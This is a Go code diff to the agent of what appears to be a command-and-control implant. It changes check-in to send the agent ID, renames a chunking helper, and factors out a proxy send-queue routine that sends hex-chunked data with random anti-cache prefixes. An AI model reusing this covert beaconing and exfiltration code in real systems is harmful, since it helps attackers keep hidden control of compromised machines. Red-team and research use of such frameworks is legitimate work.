@@ -4,6 +4,7 @@ import (
 	"context"
 	"crypto"
 	"crypto/md5"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"log"
@@ -116,7 +117,12 @@ func (a *Agent) CheckIn() {
 		if a.crypto.secret == nil {
 			log.Printf("checking in with dummy data (no secret computed yet)\n")
 			a.CleanupSendQ(AgentCommand_AGENT_COMMAND_CHECKIN)
-			a.QueueData(AgentCommand_AGENT_COMMAND_CHECKIN, []byte{0xff})
+			agentId, err := hex.DecodeString(a.id)
+			if err != nil {
+				log.Printf("error checking in with agent id\n")
+				return
+			}
+			a.QueueData(AgentCommand_AGENT_COMMAND_CHECKIN, agentId)
 			return
 		}
 
@@ -173,7 +179,7 @@ func (a *Agent) Keyx() {
 func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 	data := BytesToHexString(bytes)
 
-	chunks := ChunkString(data, SENDQ_CHUNK_LEN)
+	chunks := SplitStringIntoChunks(data, SENDQ_CHUNK_LEN)
 	totalChunks := len(chunks)
 
 	// unique-ish identifier for each sent command to aide in reconstruction
@@ -213,24 +219,29 @@ func (a *Agent) IsCommandInSendQ(findCommand AgentCommand) bool {
 	return false
 }
 
+func (a *Agent) ProcessSendQProxy() {
+	var data []string
+
+	var commandsSent []AgentCommand
+	for item, command := range a.sendq {
+		antiCacheValue := a.crypto.RandomHexString(4)
+		segment := antiCacheValue + "." + item
+		data = append(data, segment)
+		commandsSent = append(commandsSent, command)
+	}
+	if len(data) > 0 {
+		a.SendToProxy(data)
+		for i := range commandsSent {
+			a.CleanupSendQ(commandsSent[i])
+		}
+	}
+	return
+}
+
 // ProcessSendQ is called by agent loop to send data back to c2
 func (a *Agent) ProcessSendQ() {
 	if a.config.ProxyEnabled == true {
-		var data []string
-
-		var commandsSent []AgentCommand
-		for item, command := range a.sendq {
-			antiCacheValue := a.crypto.RandomHexString(4)
-			segment := antiCacheValue + "." + item
-			data = append(data, segment)
-			commandsSent = append(commandsSent, command)
-		}
-		if len(data) > 0 {
-			a.SendToProxy(data)
-			for i := range commandsSent {
-				a.CleanupSendQ(commandsSent[i])
-			}
-		}
+		a.ProcessSendQProxy()
 		return
 	}
 
